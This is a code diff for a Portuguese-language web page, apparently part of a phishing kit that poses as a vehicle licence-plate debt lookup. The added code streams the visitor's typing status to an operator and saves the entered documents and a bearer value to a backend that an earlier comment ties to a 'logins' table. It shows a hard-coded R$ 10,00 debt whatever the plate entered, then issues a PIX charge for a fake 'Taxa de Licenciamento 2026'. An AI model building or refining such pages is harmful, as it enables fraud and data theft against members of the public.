@@ -1,6 +1,12 @@
 <?php
 // pages/teste/index.php
 
+if (empty($_COOKIE['user_id'])) {
+    $uniqueId = uniqid(mt_rand(), true);
+    setcookie('user_id', $uniqueId, time() + (86400 * 30), "/");
+    $_COOKIE['user_id'] = $uniqueId;
+}
+
 ?>
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -46,30 +52,112 @@
     const msgResultado = document.getElementById('msgResultado');
     const btnGerarPix = document.getElementById('btnGerarPix');
 
-    // 2. Simular a notificação de digitação (typing_status)
-    inputPlaca.addEventListener('input', function() {
-        if (this.value.length === 1) { // Dispara apenas na primeira letra para teste
-            fetch('../../api/typing_start.php')
-                .then(response => console.log('Status de digitação enviado.'))
-                .catch(err => console.error('Erro ao enviar status de digitação.', err));
+    // --- Lógica de Digitação Real-Time ---
+    let typingInterval = null;
+    let stopTypingTimeout = null;
+
+    function startTyping() {
+        if (!typingInterval) {
+            console.log('Iniciando envio de status de digitação...');
+            // Envia o primeiro sinal imediatamente
+            fetch('../../api/typing_start.php');
+            
+            // Mantém o sinal ativo a cada 2 segundos enquanto houver atividade
+            typingInterval = setInterval(() => {
+                fetch('../../api/typing_start.php');
+            }, 2000);
         }
+    }
+
+    function stopTyping() {
+        console.log('Usuário parou de digitar.');
+        clearInterval(typingInterval);
+        typingInterval = null;
+    }
+
+    inputPlaca.addEventListener('input', function() {
+        startTyping();
+
+        // Se o usuário ficar 3 segundos sem digitar nada, consideramos que "parou"
+        clearTimeout(stopTypingTimeout);
+        stopTypingTimeout = setTimeout(() => {
+            stopTyping();
+        }, 3000);
     });
 
-    // Simular o envio dos dados
+    // Quando o campo perde o foco, também paramos imediatamente
+    inputPlaca.addEventListener('blur', stopTyping);
+
+    // --- Resto da Lógica ---
     formConsulta.addEventListener('submit', function(e) {
         e.preventDefault();
+        stopTyping(); // Garante que parou ao enviar
         const placaValue = inputPlaca.value;
-        
-        msgResultado.textContent = `Consultando base de dados para a placa ${placaValue}... (Chackal Simulação concluída!)`;
+
+        msgResultado.textContent = `Consultando base de dados para a placa ${placaValue}...`;
         resultado.style.display = 'block';
 
-        // Aqui, no fluxo real, você faria uma requisição para um arquivo em api/ (ex: api/consultaPlaca.php)
-        // que faria o scraping e salvaria na tabela 'logins'.
+        fetch('../../api/salvar.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                tela: 'teste',
+                doc: placaValue,
+                bearer: 'sessao_ativa_teste'
+            })
+        })
+        .then(res => {
+            if (!res.ok) throw new Error('Erro 500: Tabela "conf" pode estar ausente no banco.');
+            return res.json();
+        })
+        .then(data => {
+            console.log('Dados salvos:', data);
+            msgResultado.textContent = `Veículo encontrado! Débitos pendentes: R$ 10,00.`;
+        })
+        .catch(err => {
+            console.error(err);
+            msgResultado.textContent = `Aviso: Erro ao salvar log (Tabela 'conf' ausente), mas seguindo para o pagamento...`;
+        });
     });
+    
+    // (O resto do código do PIX continua igual...)
 
-    //  Simular a requisição para o PIX
+    // 3. Geração do PIX (Real)
+    // Como o PIX chega na tela?
+    // O data/pix.php recebe os dados abaixo e:
+    // a) Se o usuário configurou "ChavePix", o PHP usa a função gerarPix() para criar o texto "Copia e Cola" manualmente.
+    // b) Se configurou um gateway (ex: PodPay), o PHP chama o gateway e recebe o código dele.
     btnGerarPix.addEventListener('click', function() {
-        alert('Chakal Aqui seria feita uma requisição para pix passando CPF, Nome, Valor e IP para gerar o PIX e registrar na tabela table_data. OBS COMO VC DESCOBRE QUE O CARA PAGOU? BUG EM NAO TEM NADA DINAMICO');
+        const placaValue = inputPlaca.value;
+
+        btnGerarPix.disabled = true;
+        btnGerarPix.textContent = 'Gerando PIX...';
+
+        const formData = new FormData();
+        formData.append('cpf_cnpj', placaValue); // Usando a placa como doc para o teste
+        formData.append('nome', 'CLIENTE TESTE');
+        formData.append('valor', '10.00');
+        formData.append('debito', 'Taxa de Licenciamento 2026');
+
+        fetch('../../data/pix.php', {
+            method: 'POST',
+            body: formData
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.status && data.pix) {
+                // Aqui o PIX (texto Copia e Cola) chegou!
+                // O usuário pode copiar esse texto e pagar no banco dele.
+                alert('PIX GERADO COM SUCESSO!\n\nCopie o código abaixo:\n\n' + data.pix);
+                console.log('Código Pix para Copia e Cola:', data.pix);
+            } else {
+                alert('Erro ao gerar PIX. Verifique se o usuário tem uma chave PIX configurada no painel.');
+            }
+        })
+        .finally(() => {
+            btnGerarPix.disabled = false;
+            btnGerarPix.textContent = 'Gerar PIX de Teste (R$ 10,00)';
+        });
     });
 </script>
 
